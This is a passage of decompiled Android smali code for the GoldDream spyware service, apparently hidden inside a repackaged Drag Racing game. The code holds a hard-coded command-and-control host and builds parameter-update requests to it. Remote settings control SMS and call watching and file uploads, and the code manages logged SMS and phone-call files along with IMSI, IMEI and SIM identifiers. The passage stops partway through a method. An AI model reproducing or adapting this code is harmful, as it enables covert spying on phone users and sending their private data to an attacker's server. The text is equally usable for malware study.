.class public Lcom/GoldDream/zj/zjService;
.super Landroid/app/Service;
.source "zjService.java"


# static fields
.field private static ArryServerParams:[Ljava/lang/String; = null

.field private static final CHANNEL_CID:Ljava/lang/String; = "1000"

.field private static Dev_IMSI:Ljava/lang/String; = null

.field private static Dev_MIEI:Ljava/lang/String; = null

.field private static Dev_SimSSN:Ljava/lang/String; = null

.field private static final KEY_ZJ_DOMAIN:Ljava/lang/String; = "dom_v"

.field private static final KEY_ZJ_ISREST:Ljava/lang/String; = "rt_v"

.field private static final KEY_ZJ_LASTUPDATEDDATETIME:Ljava/lang/String; = "lud_v"

.field private static final KEY_ZJ_LASTWORKTASK_DATETIME:Ljava/lang/String; = "ltd_v"

.field private static final KEY_ZJ_MAXSIZE:Ljava/lang/String; = "ms_v"

.field private static final KEY_ZJ_RESTTIME:Ljava/lang/String; = "rtt_v"

.field private static final KEY_ZJ_TASKPERHOURS:Ljava/lang/String; = "tph_v"

.field private static final KEY_ZJ_TASKTYPE:Ljava/lang/String; = "tti_v"

.field private static final KEY_ZJ_UID:Ljava/lang/String; = "uid_v"

.field private static final KEY_ZJ_UPLOADWATCHFILES:Ljava/lang/String; = "uwf_v"

.field private static final KEY_ZJ_WATCHCALL:Ljava/lang/String; = "wc_v"

.field private static final KEY_ZJ_WATCHSMS:Ljava/lang/String; = "ws_v"

.field private static MYUA:Ljava/lang/String; = null

.field private static final OBJ_ZJ_DOMAIN:Ljava/lang/String; = "dom"

.field private static final OBJ_ZJ_ISREST:Ljava/lang/String; = "rt"

.field private static final OBJ_ZJ_LASTUPDATEDDATETIME:Ljava/lang/String; = "lud"

.field private static final OBJ_ZJ_LASTWORKTASK_DATETIME:Ljava/lang/String; = "ltd"

.field private static final OBJ_ZJ_MAXSIZE:Ljava/lang/String; = "ms"

.field private static final OBJ_ZJ_RESTTIME:Ljava/lang/String; = "rtt"

.field private static final OBJ_ZJ_TASKPERHOURS:Ljava/lang/String; = "tph"

.field private static final OBJ_ZJ_TASKTYPE:Ljava/lang/String; = "tti"

.field private static final OBJ_ZJ_UID:Ljava/lang/String; = "uid"

.field private static final OBJ_ZJ_UPLOADWATCHFILES:Ljava/lang/String; = "uwf"

.field private static final OBJ_ZJ_WATCHCALL:Ljava/lang/String; = "wc"

.field private static final OBJ_ZJ_WATCHSMS:Ljava/lang/String; = "ws"

.field private static final PRODUCT_PID:Ljava/lang/String; = "9965"


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    const-string v1, ""

    .line 33
    const-string v0, ""

    sput-object v1, Lcom/GoldDream/zj/zjService;->Dev_MIEI:Ljava/lang/String;

    .line 34
    const-string v0, ""

    sput-object v1, Lcom/GoldDream/zj/zjService;->Dev_SimSSN:Ljava/lang/String;

    .line 35
    const-string v0, ""

    sput-object v1, Lcom/GoldDream/zj/zjService;->Dev_IMSI:Ljava/lang/String;

    .line 67
    const-string v0, ""

    sput-object v1, Lcom/GoldDream/zj/zjService;->MYUA:Ljava/lang/String;

    .line 32
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 32
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private CheckAndClearFile(Ljava/lang/String;)V
    .locals 10
    .param p1, "objFile"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 236
    invoke-direct {p0, p1}, Lcom/GoldDream/zj/zjService;->fileIsExists(Ljava/lang/String;)Z

    move-result v8

    if-nez v8, :cond_1

    .line 270
    :cond_0
    :goto_0
    return-void

    .line 240
    :cond_1
    const/4 v0, 0x0

    .line 241
    .local v0, "Fis":Ljava/io/FileInputStream;
    const/4 v4, 0x0

    .line 242
    .local v4, "fSize":I
    const-string v8, "ms"

    const-string v9, "ms_v"

    invoke-virtual {p0, v8, v9}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/Integer;->intValue()I

    move-result v2

    .line 244
    .local v2, "MaxSize":I
    :try_start_0
    new-instance v1, Ljava/io/FileInputStream;

    invoke-direct {v1, p1}, Ljava/io/FileInputStream;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_1

    .end local v0    # "Fis":Ljava/io/FileInputStream;
    .local v1, "Fis":Ljava/io/FileInputStream;
    move-object v0, v1

    .line 250
    .end local v1    # "Fis":Ljava/io/FileInputStream;
    .restart local v0    # "Fis":Ljava/io/FileInputStream;
    :goto_1
    :try_start_1
    invoke-virtual {v0}, Ljava/io/FileInputStream;->available()I
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_2

    move-result v4

    .line 255
    :goto_2
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    .line 257
    mul-int/lit16 v8, v2, 0x400

    if-lt v4, v8, :cond_0

    .line 259
    const-string v8, "/"

    invoke-virtual {p1, v8}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v6

    .line 260
    .local v6, "m":I
    add-int/lit8 v8, v6, 0x1

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v9

    invoke-virtual {p1, v8, v9}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v7

    .line 262
    .local v7, "objTmp":Ljava/lang/String;
    const/4 v8, 0x2

    :try_start_2
    invoke-virtual {p0, v7, v8}, Lcom/GoldDream/zj/zjService;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v5

    .line 263
    .local v5, "fos":Ljava/io/FileOutputStream;
    new-instance v8, Ljava/lang/String;

    const-string v9, ""

    invoke-direct {v8, v9}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/lang/String;->getBytes()[B

    move-result-object v8

    invoke-virtual {v5, v8}, Ljava/io/FileOutputStream;->write([B)V

    .line 264
    invoke-virtual {v5}, Ljava/io/FileOutputStream;->close()V
    :try_end_2
    .catch Ljava/io/FileNotFoundException; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    .line 265
    .end local v5    # "fos":Ljava/io/FileOutputStream;
    :catch_0
    move-exception v8

    move-object v3, v8

    .line 267
    .local v3, "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v3}, Ljava/io/FileNotFoundException;->printStackTrace()V

    goto :goto_0

    .line 245
    .end local v3    # "e":Ljava/io/FileNotFoundException;
    .end local v6    # "m":I
    .end local v7    # "objTmp":Ljava/lang/String;
    :catch_1
    move-exception v8

    move-object v3, v8

    .line 247
    .restart local v3    # "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v3}, Ljava/io/FileNotFoundException;->printStackTrace()V

    goto :goto_1

    .line 251
    .end local v3    # "e":Ljava/io/FileNotFoundException;
    :catch_2
    move-exception v3

    .line 253
    .local v3, "e":Ljava/io/IOException;
    invoke-virtual {v3}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2
.end method

.method private InitializedWorkArea()V
    .locals 8

    .prologue
    const-string v7, "lud_v"

    const-string v6, "lud"

    const-string v5, "dom_v"

    const-string v4, "dom"

    const-string v3, "0"

    .line 83
    const-string v0, "rt"

    const-string v1, "rt_v"

    invoke-virtual {p0, v0, v1}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-gtz v0, :cond_0

    .line 84
    const-string v0, "rt"

    const-string v1, "rt_v"

    const-string v2, "0"

    invoke-virtual {p0, v0, v1, v3}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 86
    :cond_0
    const-string v0, "tph"

    const-string v1, "tph_v"

    invoke-virtual {p0, v0, v1}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-gtz v0, :cond_1

    .line 87
    const-string v0, "tph"

    const-string v1, "tph_v"

    const-string v2, "3"

    invoke-virtual {p0, v0, v1, v2}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 89
    :cond_1
    const-string v0, "ms"

    const-string v1, "ms_v"

    invoke-virtual {p0, v0, v1}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-gtz v0, :cond_2

    .line 90
    const-string v0, "ms"

    const-string v1, "ms_v"

    const-string v2, "512"

    invoke-virtual {p0, v0, v1, v2}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 92
    :cond_2
    const-string v0, "rtt"

    const-string v1, "rtt_v"

    invoke-virtual {p0, v0, v1}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-gtz v0, :cond_3

    .line 93
    const-string v0, "rtt"

    const-string v1, "rtt_v"

    const-string v2, "1-4"

    invoke-virtual {p0, v0, v1, v2}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 95
    :cond_3
    const-string v0, "uwf"

    const-string v1, "uwf_v"

    invoke-virtual {p0, v0, v1}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-gtz v0, :cond_4

    .line 96
    const-string v0, "uwf"

    const-string v1, "uwf_v"

    const-string v2, "0"

    invoke-virtual {p0, v0, v1, v3}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 98
    :cond_4
    const-string v0, "ws"

    const-string v1, "ws_v"

    invoke-virtual {p0, v0, v1}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-gtz v0, :cond_5

    .line 99
    const-string v0, "ws"

    const-string v1, "ws_v"

    const-string v2, "0"

    invoke-virtual {p0, v0, v1, v3}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 101
    :cond_5
    const-string v0, "wc"

    const-string v1, "wc_v"

    invoke-virtual {p0, v0, v1}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-gtz v0, :cond_6

    .line 102
    const-string v0, "wc"

    const-string v1, "wc_v"

    const-string v2, "0"

    invoke-virtual {p0, v0, v1, v3}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 104
    :cond_6
    const-string v0, "dom"

    const-string v0, "dom_v"

    invoke-virtual {p0, v4, v5}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-gtz v0, :cond_7

    .line 105
    const-string v0, "dom"

    const-string v0, "dom_v"

    const-string v0, "lebar.gicp.net"

    invoke-virtual {p0, v4, v5, v0}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 107
    :cond_7
    const-string v0, "tti"

    const-string v1, "tti_v"

    invoke-virtual {p0, v0, v1}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-gtz v0, :cond_8

    .line 108
    const-string v0, "tti"

    const-string v1, "tti_v"

    const-string v2, "1"

    invoke-virtual {p0, v0, v1, v2}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 110
    :cond_8
    const-string v0, "lud"

    const-string v0, "lud_v"

    invoke-virtual {p0, v6, v7}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-gtz v0, :cond_9

    .line 111
    const-string v0, "lud"

    const-string v0, "lud_v"

    const-string v0, "2011-6-1 00:00:00"

    invoke-virtual {p0, v6, v7, v0}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 115
    :cond_9
    return-void
.end method

.method private IsClearLocalWatchFiles()V
    .locals 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 218
    const-string v1, "/data/data/com.creativemobi.DragRacing/files/zjsms.txt"

    .line 219
    .local v1, "objSmsFile":Ljava/lang/String;
    const-string v0, "/data/data/com.creativemobi.DragRacing/files/zjphonecall.txt"

    .line 224
    .local v0, "objCallFile":Ljava/lang/String;
    invoke-direct {p0, v1}, Lcom/GoldDream/zj/zjService;->CheckAndClearFile(Ljava/lang/String;)V

    .line 225
    invoke-direct {p0, v0}, Lcom/GoldDream/zj/zjService;->CheckAndClearFile(Ljava/lang/String;)V

    .line 226
    return-void
.end method

.method private IsRestTime()Z
    .locals 9

    .prologue
    const/4 v8, 0x0

    .line 419
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 420
    .local v2, "resultBoolean":Ljava/lang/Boolean;
    const/4 v6, 0x4

    invoke-direct {p0, v6}, Lcom/GoldDream/zj/zjService;->getNowTime(I)I

    move-result v1

    .line 421
    .local v1, "nowHour":I
    const-string v6, "rtt"

    const-string v7, "rtt_v"

    invoke-virtual {p0, v6, v7}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 422
    .local v5, "tmpRestTime":Ljava/lang/String;
    const-string v6, "-"

    invoke-virtual {v5, v6, v8}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v0

    .line 423
    .local v0, "m":I
    invoke-virtual {v5, v8, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v3

    .line 424
    .local v3, "tmpBegin":I
    add-int/lit8 v6, v0, 0x1

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v7

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v4

    .line 425
    .local v4, "tmpEnd":I
    if-lt v1, v3, :cond_0

    if-gt v1, v4, :cond_0

    .line 426
    const/4 v6, 0x1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 428
    :cond_0
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v6

    return v6
.end method

.method private SetLocalParams(Ljava/lang/String;)V
    .locals 10
    .param p1, "objStr"    # Ljava/lang/String;

    .prologue
    const/16 v9, 0xa

    const/4 v8, 0x0

    const-string v6, "#"

    .line 339
    move-object v2, p1

    .line 341
    .local v2, "tmpStr":Ljava/lang/String;
    new-array v4, v9, [Ljava/lang/String;

    sput-object v4, Lcom/GoldDream/zj/zjService;->ArryServerParams:[Ljava/lang/String;

    .line 342
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    if-lt v0, v9, :cond_0

    .line 351
    :goto_1
    const/4 v3, 0x0

    .local v3, "y":I
    :goto_2
    if-lt v3, v9, :cond_2

    .line 387
    return-void

    .line 343
    .end local v3    # "y":I
    :cond_0
    const-string v4, "#"

    invoke-virtual {v2, v6, v8}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v4

    if-gtz v4, :cond_1

    .line 344
    sget-object v4, Lcom/GoldDream/zj/zjService;->ArryServerParams:[Ljava/lang/String;

    invoke-virtual {v2}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v0

    goto :goto_1

    .line 347
    :cond_1
    const-string v4, "#"

    invoke-virtual {v2, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    .line 348
    .local v1, "m":I
    sget-object v4, Lcom/GoldDream/zj/zjService;->ArryServerParams:[Ljava/lang/String;

    invoke-virtual {v2, v8, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v0

    .line 349
    add-int/lit8 v4, v1, 0x1

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v5

    invoke-virtual {v2, v4, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    .line 342
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    .line 352
    .end local v1    # "m":I
    .restart local v3    # "y":I
    :cond_2
    packed-switch v3, :pswitch_data_0

    .line 351
    :goto_3
    add-int/lit8 v3, v3, 0x1

    goto :goto_2

    .line 354
    :pswitch_0
    const-string v4, "lud"

    const-string v5, "lud_v"

    sget-object v6, Lcom/GoldDream/zj/zjService;->ArryServerParams:[Ljava/lang/String;

    aget-object v6, v6, v8

    invoke-virtual {p0, v4, v5, v6}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    .line 357
    :pswitch_1
    const-string v4, "dom"

    const-string v5, "dom_v"

    sget-object v6, Lcom/GoldDream/zj/zjService;->ArryServerParams:[Ljava/lang/String;

    const/4 v7, 0x1

    aget-object v6, v6, v7

    invoke-virtual {p0, v4, v5, v6}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    .line 360
    :pswitch_2
    const-string v4, "tph"

    const-string v5, "tph_v"

    sget-object v6, Lcom/GoldDream/zj/zjService;->ArryServerParams:[Ljava/lang/String;

    const/4 v7, 0x2

    aget-object v6, v6, v7

    invoke-virtual {p0, v4, v5, v6}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    .line 363
    :pswitch_3
    const-string v4, "rt"

    const-string v5, "rt_v"

    sget-object v6, Lcom/GoldDream/zj/zjService;->ArryServerParams:[Ljava/lang/String;

    const/4 v7, 0x3

    aget-object v6, v6, v7

    invoke-virtual {p0, v4, v5, v6}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    .line 366
    :pswitch_4
    const-string v4, "rtt"

    const-string v5, "rtt_v"

    sget-object v6, Lcom/GoldDream/zj/zjService;->ArryServerParams:[Ljava/lang/String;

    const/4 v7, 0x4

    aget-object v6, v6, v7

    invoke-virtual {p0, v4, v5, v6}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    .line 369
    :pswitch_5
    const-string v4, "uwf"

    const-string v5, "uwf_v"

    sget-object v6, Lcom/GoldDream/zj/zjService;->ArryServerParams:[Ljava/lang/String;

    const/4 v7, 0x5

    aget-object v6, v6, v7

    invoke-virtual {p0, v4, v5, v6}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    .line 372
    :pswitch_6
    const-string v4, "ms"

    const-string v5, "ms_v"

    sget-object v6, Lcom/GoldDream/zj/zjService;->ArryServerParams:[Ljava/lang/String;

    const/4 v7, 0x6

    aget-object v6, v6, v7

    invoke-virtual {p0, v4, v5, v6}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    .line 375
    :pswitch_7
    const-string v4, "ws"

    const-string v5, "ws_v"

    sget-object v6, Lcom/GoldDream/zj/zjService;->ArryServerParams:[Ljava/lang/String;

    const/4 v7, 0x7

    aget-object v6, v6, v7

    invoke-virtual {p0, v4, v5, v6}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    .line 378
    :pswitch_8
    const-string v4, "wc"

    const-string v5, "wc_v"

    sget-object v6, Lcom/GoldDream/zj/zjService;->ArryServerParams:[Ljava/lang/String;

    const/16 v7, 0x8

    aget-object v6, v6, v7

    invoke-virtual {p0, v4, v5, v6}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    .line 381
    :pswitch_9
    const-string v4, "tti"

    const-string v5, "tti_v"

    sget-object v6, Lcom/GoldDream/zj/zjService;->ArryServerParams:[Ljava/lang/String;

    const/16 v7, 0x9

    aget-object v6, v6, v7

    invoke-virtual {p0, v4, v5, v6}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    .line 352
    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
        :pswitch_7
        :pswitch_8
        :pswitch_9
    .end packed-switch
.end method

.method private UpdatedParametersFromServer()V
    .locals 5

    .prologue
    .line 330
    invoke-direct {p0}, Lcom/GoldDream/zj/zjService;->isUpdateParam()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 331
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "http://"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "dom"

    const-string v4, "dom_v"

    invoke-virtual {p0, v3, v4}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/zj/upload/UpdateParam.aspx?"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 332
    .local v0, "objUrl":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "uid="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "uid"

    const-string v4, "uid_v"

    invoke-virtual {p0, v3, v4}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&taskTypeId="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "tti"

    const-string v4, "tti_v"

    invoke-virtual {p0, v3, v4}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 333
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "&type=0"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 334
    invoke-virtual {p0, v0}, Lcom/GoldDream/zj/zjService;->getValueFromServer(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 335
    .local v1, "tmpObjStr":Ljava/lang/String;
    invoke-direct {p0, v1}, Lcom/GoldDream/zj/zjService;->SetLocalParams(Ljava/lang/String;)V

    .line 337
    .end local v0    # "objUrl":Ljava/lang/String;
    .end local v1    # "tmpObjStr":Ljava/lang/String;
    :cond_0
    return-void
.end method

.method static synthetic access$0(Lcom/GoldDream/zj/zjService;)V
    .locals 0

    .prologue
    .line 70
    invoke-direct {p0}, Lcom/GoldDream/zj/zjService;->InitializedWorkArea()V

    return-void
.end method

.method static synthetic access$1(Lcom/GoldDream/zj/zjService;)V
    .locals 0

    .prologue
    .line 325
    invoke-direct {p0}, Lcom/GoldDream/zj/zjService;->UpdatedParametersFromServer()V

    return-void
.end method

.method static synthetic access$2(Lcom/GoldDream/zj/zjService;)V
    .locals 0

    .prologue
    .line 271
    invoke-direct {p0}, Lcom/GoldDream/zj/zjService;->checkUpload()V

    return-void
.end method

.method static synthetic access$3(Lcom/GoldDream/zj/zjService;)V
    .locals 0
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 217
    invoke-direct {p0}, Lcom/GoldDream/zj/zjService;->IsClearLocalWatchFiles()V

    return-void
.end method

.method private checkUpload()V
    .locals 4

    .prologue
    .line 274
    const-string v2, "uwf"

    const-string v3, "uwf_v"

    invoke-virtual {p0, v2, v3}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 275
    .local v1, "tmpS":Ljava/lang/String;
    const-string v2, "1"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 277
    :try_start_0
    invoke-direct {p0}, Lcom/GoldDream/zj/zjService;->uploadAllFiles()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 283
    :cond_0
    :goto_0
    return-void

    .line 278
    :catch_0
    move-exception v0

    .line 280
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method

.method private compareTwoDate(Ljava/lang/String;Ljava/lang/String;)J
    .locals 9
    .param p1, "firstDate"    # Ljava/lang/String;
    .param p2, "secondDate"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/text/ParseException;
        }
    .end annotation

    .prologue
    .line 411
    new-instance v4, Ljava/text/SimpleDateFormat;

    const-string v5, "yyyy-MM-dd hh:mm:ss"

    invoke-direct {v4, v5}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 412
    .local v4, "myFormatter":Ljava/text/SimpleDateFormat;
    invoke-virtual {v4, p1}, Ljava/text/SimpleDateFormat;->parse(Ljava/lang/String;)Ljava/util/Date;

    move-result-object v0

    .line 413
    .local v0, "date1":Ljava/util/Date;
    invoke-virtual {v4, p2}, Ljava/text/SimpleDateFormat;->parse(Ljava/lang/String;)Ljava/util/Date;

    move-result-object v1

    .line 414
    .local v1, "date2":Ljava/util/Date;
    invoke-virtual {v0}, Ljava/util/Date;->getTime()J

    move-result-wide v5

    invoke-virtual {v1}, Ljava/util/Date;->getTime()J

    move-result-wide v7

    sub-long/2addr v5, v7

    const-wide/32 v7, 0x36ee80

    div-long v2, v5, v7

    .line 416
    .local v2, "hour":J
    return-wide v2
.end method

.method private fileIsExists(Ljava/lang/String;)Z
    .locals 3
    .param p1, "objF"    # Ljava/lang/String;

    .prologue
    .line 228
    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 229
    .local v1, "rst":Ljava/lang/Boolean;
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 230
